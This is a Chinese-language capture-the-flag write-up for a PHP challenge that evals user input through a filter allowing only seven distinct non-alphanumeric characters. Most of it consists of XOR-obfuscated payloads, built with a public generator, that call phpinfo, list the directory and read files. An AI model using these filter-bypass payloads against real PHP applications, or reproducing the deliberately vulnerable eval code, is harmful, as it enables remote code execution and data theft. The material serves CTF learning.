### babyPhp
```php
<?php
function validate($text) {
    if (count(array_count_values(str_split($text))) > 7) {
        return false;
    }
    if (preg_match('/[a-z0-9]/i', $text)) {
        return false;
    }
    return true;
}

if (isset($_GET["exp"]) && !empty($_GET["exp"]) && is_string($_GET["exp"])) {
    echo $_GET["exp"];
    if(validate($_GET['exp']) === true) {
        eval($_GET['exp']);
    }
}else{
    highlight_file(__FILE__);
}
?>
```
当时搜到了限制13个重复字符的题ISITDTU 2019的EasyPHP
原题的一种解法是通过寻找重复字符来减少字符使用

这里限制的是7个字符.原来的方法我尝试过的最少能用10个,7个达不到,参考: [Unleashing XOR Magic： A Victory in Web CTF ：： KIAL Mohammed Yassine — Hello Friend NG 主题 (f00l1shf0x.com)](https://f00l1shf0x.com/posts/2024/02/unleashing-xor-magic-a-triumph-in-web-ctf/)

去GitHub下载脚本: [Yassine-Kial/xorify: python script for xor payload generation (github.com)](https://github.com/Yassine-Kial/xorify)

```python
python xor.py --payload "phpinfo" --valid_charset "*.;)(^" --char_separator "." --char_wrap "'" --case_sensitive 0

('.'^'^').('*'^'.'^';'^')'^'^').('.'^'^').('*'^'.'^';'^'('^'^').('*'^';'^')'^'('^'^').('*'^';'^')'^'^').('*'^';'^'^')
```
phpinfo:
```
(('.'^'^').('*'^'.'^';'^')'^'^').('.'^'^').('*'^'.'^';'^'('^'^').('*'^';'^')'^'('^'^').('*'^';'^')'^'^').('*'^';'^'^'))();
```
![image.png](https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240331012416.png)


需要啥构造啥就行了
`(print_r)((scandir)('.'));`
```
print_r:
('.'^'^').('*'^'.'^'('^'^').('*'^'.'^';'^'('^'^').('*'^';'^')'^'('^'^').('*'^'^').(')'^'('^'^').('*'^'.'^'('^'^')

scandir
('*'^'.'^')'^'^').('.'^';'^'('^'^').('*'^'.'^';'^'^').('*'^';'^')'^'('^'^').(';'^')'^'('^'^').('*'^'.'^';'^'('^'^').('*'^'.'^'('^'^')

(('.'^'^').('*'^'.'^'('^'^').('*'^'.'^';'^'('^'^').('*'^';'^')'^'('^'^').('*'^'^').(')'^'('^'^').('*'^'.'^'('^'^'))((('*'^'.'^')'^'^').('.'^';'^'('^'^').('*'^'.'^';'^'^').('*'^';'^')'^'('^'^').(';'^')'^'('^'^').('*'^'.'^';'^'('^'^').('*'^'.'^'('^'^'))('.'));
```

`(print_r)(((file)(((end)(((glob)(('*.*'))))))));`

```
(('.'^'^').('*'^'.'^'('^'^').('*'^'.'^';'^'('^'^').('*'^';'^')'^'('^'^').('*'^'^').(')'^'('^'^').('*'^'.'^'('^'^'))(((('*'^';'^')'^'^').('*'^'.'^';'^'('^'^').(';'^')'^'^').(';'^'^'))((((';'^'^').('*'^';'^')'^'('^'^').(';'^')'^'('^'^'))(((('*'^';'^'('^'^').(';'^')'^'^').('*'^';'^'^').('.'^';'^')'^'^'))(('*.*'))))))));
```
